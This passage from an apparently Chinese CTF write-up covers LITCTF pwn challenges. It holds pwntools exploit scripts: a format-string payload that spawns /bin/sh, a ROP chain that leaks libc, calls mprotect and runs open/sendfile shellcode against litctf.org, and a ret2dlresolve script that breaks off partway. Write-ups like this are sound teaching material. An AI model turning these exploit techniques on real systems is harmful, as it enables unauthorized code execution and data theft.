    pl <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"%c%c%c%c%c%c%c%c%c%c%c%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s2<span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">&#125;</span></span><span class="token string">c%hhn"</span></span>
    pl <span class="token operator">=</span> pl<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> 
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    pl <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"%c%c%c%c%c%c%c%c%c%c%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>s1<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">c%hn"</span></span>
    pl <span class="token operator">=</span> pl<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> 
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span> 
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>但我不知道为什么每次遇到这种题目，本地调试每次改总是不成功吧。反正很奇怪。我当时比赛的时候打通了，现在不知道怎么得就是没通，也是很搞笑了。如果有师傅知道为什么可以评论告诉我，谢谢师傅。</p>
<h5 id="pwn-recurse"><a href="#pwn-recurse" class="headerlink" title="pwn&#x2F;recurse"></a>pwn&#x2F;recurse</h5><blockquote>
<p>I hate loops.</p>
</blockquote>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;string.h></span>
<span class="token preprocessor property">#include &lt;stdlib.h></span>
<span class="token preprocessor property">#include &lt;unistd.h></span>
<span class="token preprocessor property">#include &lt;sys/wait.h></span>

<span class="token keyword">int</span> <span class="token keyword">get</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">int</span></span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> n<span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token operator">==</span> NULL<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> end <span class="token operator">=</span> <span class="token function">strcspn</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>end<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\0'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Too long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    buf<span class="token punctuation">[</span>end<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> end<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Filename? "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> fname<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> fn <span class="token operator">=</span> <span class="token keyword">get</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">fname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> fn<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name"><span class="token keyword">char</span></span> c <span class="token operator">=</span> fname<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token char">'a'</span> <span class="token operator">&lt;=</span> c <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token char">'z'</span><span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Only a-z and ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"flag.txt"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> NULL<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nice try!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    FILE<span class="token operator">*</span> file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"a+b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Read (R) or Write (W)? "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> option<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">get</span><span class="token punctuation">(</span>option<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">option</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">switch</span> <span class="token punctuation">(</span>option<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token char">'R'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">char</span> contents<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">int</span></span> n <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">contents</span><span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Contents: "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">case</span> <span class="token char">'W'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Contents? "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">char</span> contents<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">int</span></span> n <span class="token operator">=</span> <span class="token keyword">get</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">contents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">fclose</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name"><span class="token keyword">int</span></span> ret <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"gcc main.c -o main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">WEXITSTATUS</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Compilation failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span> <span class="token string">"main"</span><span class="token punctuation">,</span> NULL<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>想法就是什么可以在main之前执行呢？ 那就是头文件，预处理、编译、汇编、链接。</p>
<p><img src="https://s2.loli.net/2024/08/19/yZQKgVEFd8CelfH.png" alt="b52180d2f45646108beb17ea1f4718fb.png"></p>
<h5 id="pwn-w4dup-2de"><a href="#pwn-w4dup-2de" class="headerlink" title="pwn&#x2F;w4dup 2de"></a>pwn&#x2F;w4dup 2de</h5><p>这题有意思，一次输入。有沙盒，</p>
<p><img src="https://s2.loli.net/2024/08/19/4lwS2z85HebP6nv.png" alt="126a482ea74a4469ad70aee7133b00fd.png"></p>
<p>哪个后面关于fd的，分析一下大致就是read只能标准输入（fd&#x3D;0）。 </p>
<p><img src="https://s2.loli.net/2024/08/19/s34CqYkgQNiLJFf.png" alt="cb896da815da4ac5a9f2fec9d5dade6d.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/srXM7IAEOqlTcWG.png" alt="2088bfe38f27419eb81aee0cdd8aff05.png"></p>
<p>看了看保护，既然可以任意写（因为rsi寄存器可以控制），那就改got表为write输出泄露libc，之后在给bss段权限来执行shellcode（openat，sendfile） </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sendfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/da1sy/environment/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6"</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"error"</span>
rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d3</span>
rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d1</span>
rbp_ret <span class="token operator">=</span> <span class="token number">0x000000000040117d</span>
leave_ret <span class="token operator">=</span> <span class="token number">0x000000000040132d</span>
bss <span class="token operator">=</span> <span class="token number">0x404800</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x28</span>
    pl <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rsi_r15_ret<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'seccomp_init'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>rsi_r15_ret<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'seccomp_init'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rsi_r15_ret<span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>rbp_ret<span class="token punctuation">,</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>p16<span class="token punctuation">(</span><span class="token number">0x71d0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    read <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">b"\x00\x00"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> read <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    rsi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002601f</span>
    rdx_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000dfc12</span>
    pl2 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span>bss<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rsi_ret<span class="token punctuation">,</span><span class="token number">0x1000</span><span class="token punctuation">,</span>rdx_ret<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    pl2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
    pl2 <span class="token operator">+=</span> shellcode
    sl<span class="token punctuation">(</span>pl2<span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token comment"># io = process("./pwn")</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"litctf.org"</span><span class="token punctuation">,</span><span class="token number">31771</span><span class="token punctuation">)</span>
        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 有一位学长给我的ret2dlresolve，感谢学长，tql !!! </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.31.so"</span><span class="token punctuation">)</span>
<span class="token comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>
lrop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"litctf.org"</span><span class="token punctuation">,</span> <span class="token number">31771</span><span class="token punctuation">)</span>

baseStage <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x800</span> <span class="token comment"># + 8</span>

<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> frbp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> p64<span class="token punctuation">(</span><span class="token number">0x4013CA</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span> <span class="token operator">+</span> \
    p64<span class="token punctuation">(</span><span class="token number">0x4013B0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>frbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>

<span class="token comment"># stack pvioting</span>
payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>baseStage <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> baseStage<span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>leave<span class="token punctuation">.</span>address<span class="token punctuation">,</span> baseStage <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># dlresolve to leak</span>
rel <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".rela.plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".dynstr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".dynsym"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"rela.plt : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rel<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"dynstr : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"dynsym : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>dynsym<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

fakeStrAddr <span class="token operator">=</span> baseStage <span class="token operator">+</span> <span class="token number">0xb0</span>
fakeStr <span class="token operator">=</span> <span class="token string">b"puts\x00"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>

fakeSymAddr <span class="token operator">=</span> fakeStrAddr <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fakeStr<span class="token punctuation">)</span>
fakeSym <span class="token operator">=</span> <span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fakeStrAddr <span class="token operator">-</span> dynstr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x12"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token comment"># + b"p"*16</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>fakeSymAddr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>fakeSymAddr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span>
symOffset <span class="token operator">=</span> <span class="token punctuation">(</span>fakeSymAddr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x18</span>

fakeRelaAddr <span class="token operator">=</span> fakeSymAddr <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fakeSym<span class="token punctuation">)</span>
